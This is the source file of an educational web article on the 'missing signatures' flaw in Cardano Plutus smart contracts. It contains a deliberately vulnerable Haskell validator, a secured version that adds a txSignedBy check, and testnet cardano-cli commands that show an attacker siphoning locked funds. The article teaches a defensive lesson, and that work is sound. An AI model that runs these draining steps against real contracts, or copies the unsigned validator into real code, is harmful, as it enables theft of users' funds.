import CodeBlock from "@/components/layouts/CodeBlock";

export const articleMeta = {
    id: "missingsignatures",
    title: "Missing Signatures Exploit",
    subtitle: "The most fundamental vulnerability: writing complex validation rules but forgetting to check who is actually pressing the button",
    date: "2025-02-25T17:00:00.000Z",
    readTime: "7 min read",
    tags: ["plutus", "cardano", "security", "exploit", "advanced"],
    author: {
        name: "Aman Kumar",
        avatar: "https://i.pravatar.cc/48?img=21",
    },
};

export default function MissingSignaturesArticle() {
    const haskellCode = `{-# LANGUAGE DataKinds           #-}
{-# LANGUAGE ImportQualifiedPost #-}
{-# LANGUAGE NoImplicitPrelude   #-}
{-# LANGUAGE OverloadedStrings   #-}
{-# LANGUAGE TemplateHaskell     #-}

module MissingSignatures where

import qualified Plutus.V2.Ledger.Api as PlutusV2
import           PlutusTx             (BuiltinData, compile, unstableMakeIsData)
import           PlutusTx.Prelude     (Bool, traceIfFalse, (&&), ($))
import           Prelude              (IO)
import           Utilities            (wrapValidator, writeValidatorToFile)

---------------------------------------------------------------------------------------------------
----------------------------------- ON-CHAIN / VULNERABLE VALIDATOR -------------------------------

-- ❌ VULNERABLE DESIGN ❌
-- A simple proxy contract. The datum hardcodes the "owner" who can withdraw the funds.
-- The redeemer specifies the action. If action == "Withdraw", the owner gets the money.
-- The logic flawlessly checks *what* the transaction is doing, but forgets to check *who* is doing it.

data ProxyDatum = ProxyDatum { owner :: PlutusV2.PubKeyHash }
PlutusTx.unstableMakeIsData ''ProxyDatum

-- We pretend 0 = Withdraw, 1 = Deposit
data ProxyAction = Withdraw | Deposit
PlutusTx.unstableMakeIsData ''ProxyAction

{-# INLINABLE mkVulnerableProxy #-}
mkVulnerableProxy :: ProxyDatum -> ProxyAction -> PlutusV2.ScriptContext -> Bool
mkVulnerableProxy dat action ctx = case action of
    Deposit  -> True -- Anyone can deposit
    Withdraw -> 
        -- The script checks that the transaction DOES contain an output going to the owner
        -- But it never checks if the owner is the one who approved this specific withdrawal!
        traceIfFalse "The owner's output is missing!" sendsToOwner
  where
    info :: PlutusV2.TxInfo
    info = PlutusV2.scriptContextTxInfo ctx

    sendsToOwner :: Bool
    sendsToOwner = 
        let ownOutputs = [ o | o <- PlutusV2.txInfoOutputs info 
                             , PlutusV2.txOutAddress o == PlutusV2.pubKeyHashAddress (owner dat) ]
        in length ownOutputs >= 1

    length :: [a] -> Integer
    length []     = 0
    length (_:xs) = 1 + length xs


---------------------------------------------------------------------------------------------------
----------------------------------- THE FIX: EXPLICIT AUTHORIZATION -------------------------------

-- ✅ SECURE DESIGN ✅
-- The transaction might physically send the ADA to the owner's address, but if the owner didn't
-- sign the transaction, an attacker can hijack the inputs and outputs to syphon off the difference.

{-# INLINABLE mkSecureProxy #-}
mkSecureProxy :: ProxyDatum -> ProxyAction -> PlutusV2.ScriptContext -> Bool
mkSecureProxy dat action ctx = case action of
    Deposit  -> True
    Withdraw -> 
        -- Rule 1: Validate the payload
        traceIfFalse "The owner's output is missing!" sendsToOwner &&
        -- Rule 2: Authenticate the actor!
        traceIfFalse "Only the owner can authorize a withdrawal!" isSignedByOwner
  where
    info :: PlutusV2.TxInfo
    info = PlutusV2.scriptContextTxInfo ctx

    sendsToOwner :: Bool
    sendsToOwner = 
        let ownOutputs = [ o | o <- PlutusV2.txInfoOutputs info 
                             , PlutusV2.txOutAddress o == PlutusV2.pubKeyHashAddress (owner dat) ]
        in length ownOutputs >= 1

    isSignedByOwner :: Bool
    isSignedByOwner = PlutusV2.txSignedBy info (owner dat)

    length :: [a] -> Integer
    length []     = 0
    length (_:xs) = 1 + length xs

{-# INLINABLE wrappedVulnVal #-}
wrappedVulnVal :: BuiltinData -> BuiltinData -> BuiltinData -> ()
wrappedVulnVal = wrapValidator mkVulnerableProxy

validator :: PlutusV2.Validator
validator =
  PlutusV2.mkValidatorScript
    $$(PlutusTx.compile [|| wrappedVulnVal ||])
`;

    const bashCommands = `# Scenario: ALICE locks 1,000 ADA in the Proxy contract. The Datum physically states "owner: alice_hash".
#
# A hacker called EVE is watching the blockchain. Eve sees the 1,000 ADA UTxO sitting there.
# Eve realizes that mkVulnerableProxy does not have a txSignedBy check.
# Eve can submit a transaction USING the Withdraw redeemer, even though she isn't Alice.

# -------------------------------------------------------------------------
# THE MISSING SIGNATURE EXPLOIT (The Syphon)
# To satisfy the one weak rule the script DOES have (sendsToOwner), Eve is forced
# to physically send 2 ADA out of the 1,000 ADA to Alice.
# Which means there is 998 ADA left over. Eve sends the rest to herself.

$ cardano-cli conway transaction build \\
  --tx-in f29c7d41ef993a40...#0 \\  <-- Alice's 1,000 ADA Proxy UTxO
  --tx-in-script-file vulnerable_proxy.plutus \\
  --tx-in-inline-datum-present \\
  \\
  # Eve proudly declares the "Withdraw" action! The contract blindly trusts her.
  --tx-in-redeemer-value '{"constructor":0,"fields":[]}' \\
  \\
  # ⚠️ THE EXPLOIT: Eve legally creates an output to Alice, fulfilling the only condition.
  --tx-out $(cat alice.addr)+2000000 \\
  \\
  # The remaining 998 ADA silently spills into Eve's change address
  --change-address $(cat eve.addr) \\
  --tx-in-collateral d83b72c9...#0 \\
  --testnet-magic 2 \\
  --out-file tx-attack.raw

# Eve signs it with HER OWN key.
$ cardano-cli conway transaction sign --tx-body-file tx-attack.raw --signing-key-file eve.skey --testnet-magic 2 --out-file tx-attack.signed

# Eve submits it. The contract happily executes. Alice gets 2 ADA. Eve gets 998 ADA.
$ cardano-cli conway transaction submit --tx-file tx-attack.signed

# Result:
# The vulnerable contract looks at the output: "Did Alice get an output?" -> True.
# Because there is no check for txSignedBy, the script returns True.
# The Cardano ledger simply balances the inputs and outputs, handing the extra ADA to Eve.
`;

    return (
        <div className="article-content">
            <h2 id="introduction">Introduction</h2>

            <p>
                In traditional Web2 programming, <strong>Authentication</strong> (Who are you?) and <strong>Authorization</strong> (Are you allowed to do this?) are deeply intertwined. Usually, you log in, and the database automatically checks your permissions against your session cookie. 
            </p>

            <p>
                But in Cardano, a smart contract is totally blind. It is a lifeless formula that only examines the mathematical inputs and outputs of a transaction. If you write 100 lines of incredibly robust validation logic enforcing <em>how</em> the funds should be routed, but forget to explicitly write 1 line verifying <em>who</em> is submitting the transaction, you have left the front door wide open.
            </p>

            <CodeBlock
                code={haskellCode}
                language="haskell"
                filename="MissingSignatures.hs"
            />
            <br />

            <h2 id="explanation">The Vulnerability Explained</h2>

            <h3>The Fallacy of Implicit Owners</h3>

            <p className="pexplaination">
                A common misconception for beginner Plutus developers is believing that because a <code>PubKeyHash</code> is physically hardcoded into a Datum, the contract automatically "belongs" to that person. This is entirely false.
            </p>

            <p className="pexplaination pt-2">
                The Datum is just a piece of passive JSON data floating on the ledger. It has exactly zero cryptographic authority. The vulnerable proxy contract above successfully reads the Datum, and successfully verifies that the transaction physically creates an output going to that <code>PubKeyHash</code>. The developer thinks, "Only Alice could make an output to Alice, so it's safe." 
            </p>

            <p className="pexplaination pt-2">
                This is the massive logical oversight. <strong>Anyone can send money to Alice.</strong>
            </p>

            <h3>The Fix: Cryptographic Proof of Will</h3>

            <CodeBlock
                code={`isSignedByOwner = PlutusV2.txSignedBy info (owner dat)`}
                language="haskell"
                filename="Enforcing the Digital Signature"
            />

            <p className="pexplaination pt-2">
                The secure version of the proxy contract fixes this by aggressively enforcing a <code>txSignedBy</code> check. When <code>txSignedBy</code> is compiled, the Cardano node physically rips open the transaction's signature array and uses Elliptic Curve Cryptography to verify that the private key matching the <code>owner dat</code> public key hash explicitly signed off on the payload.
            </p>

            <p className="pexplaination">
                If an attacker tries to execute a withdrawal, they fundamentally cannot produce the cryptographic signature of the owner. The <code>txSignedBy</code> function evaluates to <code>False</code>, instantly preventing them from moving the funds, regardless of whether they perfectly matched every other operational rule in the contract.
            </p>

            <br />

            <h2 id="execution">The Attacker's CLI Lifecycle</h2>

            <p className="pexplaination">
                This is one of the most brutal exploits in blockchain because the attacker achieves complete capitulation by simply playing by the contract's weak rules. The attacker pays the bare minimum required to satisfy the script's output condition (in this case, sending Alice the min-ADA of 2 ADA), and intercepts the remaining colossal balance by routing it to their own change address. 
            </p>

            <CodeBlock
                code={bashCommands}
                language="bash"
                filename="The Authorization Syphon"
            />

        </div>
    );
}
